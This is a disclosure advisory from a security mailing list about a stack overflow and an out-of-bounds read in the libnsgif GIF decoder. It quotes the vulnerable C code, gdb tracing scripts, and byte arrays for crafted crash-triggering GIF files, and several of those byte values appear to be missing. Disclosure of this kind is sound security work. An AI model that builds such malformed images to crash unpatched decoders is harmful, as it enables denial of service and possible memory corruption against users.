  oss-security - libnsgif: stack overflow and out-of-bounds read            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Wed, 16 Dec From: Hans Jerry Illikainen <hji@...topia.com> To: bugtraq@...urityfocus.com, fulldisclosure@...lists.org, oss-security@...ts.openwall.com Subject: libnsgif: stack overflow and out-of-bounds read   Overview ========  Libnsgif[1] is a decoding library for GIF images.  It is primarily developed and used as part of the NetSurf project.  As of version libnsgif is vulnerable to a stack overflow and an out-of-bounds read due to the way LZW-compressed GIF data is processed.   Details =======  src/libnsgif.c ,---- | /*    Maximum LZW bits available | */ | #define GIF_MAX_LZW 12 | [...] | static int table[2][(1 << GIF_MAX_LZW)]; | static unsigned char stack[(1 << GIF_MAX_LZW) * 2]; `----  src/libnsgif.c ,---- | static gif_result gif_initialise_frame(gif_animation *gif) { | [...] |     if (gif_data[0] > GIF_MAX_LZW) |         return GIF_DATA_ERROR; | [...] | } `----   src/libnsgif.c ,---- | gif_result gif_decode_frame(gif_animation *gif, unsigned int frame) { | [...] |         /*    Initialise the LZW decoding |         */ |         set_code_size = gif_data[0]; | [...] |         code_size = set_code_size + 1; |         clear_code = (1 << set_code_size); |         end_code = clear_code + 1; |         max_code_size = clear_code << 1; |         max_code = clear_code + 2; | [...] | } `----   src/libnsgif.c ,---- | void gif_init_LZW(gif_animation *gif) { | [...] |     *stack_pointer++ =firstcode; | } `----   src/libnsgif.c ,---- | static bool gif_next_LZW(gif_animation *gif) { | [...] |     code = gif_next_code(gif, code_size); | [...] |     incode = code; |     if (code >= max_code) { |         *stack_pointer++ = firstcode; |         code = oldcode; |     } |  |     /* The following loop is the most important in the GIF decoding cycle as every |      * single pixel passes through it. |      * |      * Note: our stack is always big enough to hold a complete decompressed chunk. */ |     while (code >= clear_code) { |         *stack_pointer++ = table[1][code]; |         new_code = table[0][code]; |         if (new_code < clear_code) { |             code = new_code; |             break; |         } |         *stack_pointer++ = table[1][new_code]; |         code = table[0][new_code]; |         if (code == new_code) { |               gif->current_error = GIF_FRAME_DATA_ERROR; |             return false; |         } |     } |  |     *stack_pointer++ = firstcode = table[1][code]; | [...] |     oldcode = incode; | [...] | } `----   =============  Since `gif_next_LZW()' writes onto the stack so long as `code' is at least `clear_code', an overflow may eventually occur while processing a maliciously crafted image.  Using NetSurf as an example:  ,---- | ~/netsurf-all-3.3/netsurf$ gdb -x stack.py --args ./nsgtk stack.gif | [...] | stack overflow: ptr: end of stack: (+3) | stack overflow: ptr: end of stack: (+4) | stack overflow: ptr: end of stack: (+5) | stack overflow: ptr: end of stack: |  | Program received signal SIGSEGV, Segmentation fault. | in gif_next_LZW at |                    *stack_pointer++ = table[1][code]; | (gdb) `----   stack.py: ,---- | class Breakpoint(gdb.Breakpoint): |     def stop(self): |         stack_pointer = get_hex("stack_pointer") |         stack = get_hex("&stack") |         stack_size = get_hex("sizeof stack / sizeof *stack") |         stack_end = stack + stack_size |  |         table_size = get_hex("sizeof table / sizeof **table / 2") |         code = get_hex("code") |  |         if stack_pointer > stack_end: |             print("stack overflow: ptr: 0x%x, end of stack: 0x%x (+%d)" % |                   (stack_pointer, stack_end, stack_pointer - stack_end)) |         if code >= table_size: |             print("out-of-bounds read: code: %d (+%d)" % |                   (code, code - table_size + 1)) |         return False |  | def get_hex(arg): |     res = gdb.execute("print/x %s" % arg, to_string=True) |     x = res.split(" ")[-1].strip() |     return int(x, 16) |  | | |  | gdb.execute("run") `----   stack.gif: ,---- | unsigned char stack[] = { |     /* GIF87a */ |     |  |     /* gif_initialise() */ |         /* gif->width */ |         /* gif->height */ |               /* gif->global_colours */ |               /* gif->background_index */ |               /* gif->aspect_ratio */ |  |     /* gif_initialise_frame() */ |     0x2c,           /* GIF_IMAGE_SEPARATOR */ |         /* offset_x */ |         /* offset_y */ |     0x1b,     /* width */ |         /* height */ |               /* flags */ |               /* code size */ |     0x0d,           /* block_size */ |  |     /* image data */ |     0xcb, |     0xf3, |     0xf3, 0xf3, |     0xf3, 0xf3, |     0xf3, 0xf3, |     0xf3, 0xf3, |     0xf3, |  |     /* end of image data */ |     |  |     /* end of .gif */ |     0x3b | }; `----   =============  If `set_code_size' is 0xc, `clear_code' is assigned a value of Since the while-loop in `gif_next_LZW()' executes so long as `code >= clear_code', an out-of-bounds read might occur due to `code' being used to dereference `table' (2d array *  A boundary check exist in that if `code >= max_code', it's assigned the value of `oldcode' -- however, the result may still exceed `max_code' due to the bookkeeping of the *original* value:  src/libnsgif.c ,---- | static bool gif_next_LZW(gif_animation *gif) { | [...] |     incode = code; |     if (code >= max_code) { |         *stack_pointer++ = firstcode; |         code = oldcode; |     } | [...] |     oldcode = incode; | [...] | } `----  Again, using NetSurf as an example:  ,---- | ~/netsurf-all-3.3/netsurf$ gdb -x oob.py --args ./nsgtk oob.gif | [...] | out-of-bounds read: code: | out-of-bounds read: code: `----   oob.py: ,---- | class Breakpoint(gdb.Breakpoint): |     def stop(self): |         stack_pointer = get_hex("stack_pointer") |         stack = get_hex("&stack") |         stack_size = get_hex("sizeof stack / sizeof *stack") |         stack_end = stack + stack_size |  |         table_size = get_hex("sizeof table / sizeof **table / 2") |         code = get_hex("code") |  |         if stack_pointer > stack_end: |             print("stack overflow: ptr: 0x%x, end of stack: 0x%x (+%d)" % |                   (stack_pointer, stack_end, stack_pointer - stack_end)) |         if code >= table_size: |             print("out-of-bounds read: code: %d (+%d)" % |                   (code, code - table_size + 1)) |         return False |  | def get_hex(arg): |     res = gdb.execute("print/x %s" % arg, to_string=True) |     x = res.split(" ")[-1].strip() |     return int(x, 16) |  | | |  | gdb.execute("run") `----   oob.gif: ,---- | unsigned char oob[] = { |     /* GIF87a */ |     |  |     /* gif_initialise() */ |         /* gif->width */ |         /* gif->height */ |               /* gif->global_colours */ |               /* gif->background_index */ |               /* gif->aspect_ratio */ |  |     /* gif_initialise_frame() */ |     0x2c,           /* GIF_IMAGE_SEPARATOR */ |         /* offset_x */ |         /* offset_y */ |     0x1b,     /* width */ |         /* height */ |               /* flags */ |     0x0c,           /* code size */ |     0x0d,           /* block_size */ |  |     /* image data */ |     0xcb, |     0xf3, |     0xf3, 0xf3, |     0xf3, 0xf3, |     0xf3, 0xf3, |     0xf3, 0xf3, |     0xf3, |  |     /* end of image data */ |     |  |     /* end of .gif */ |     0x3b | }; `----   Solution ========  Both vulnerabilities are fixed in git HEAD[2].    Footnotes _________  [1] [http://www.netsurf-browser.org/projects/libnsgif/]  [2] [http://source.netsurf-browser.org/libnsgif.git/]    Hans Jerry Illikainen  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      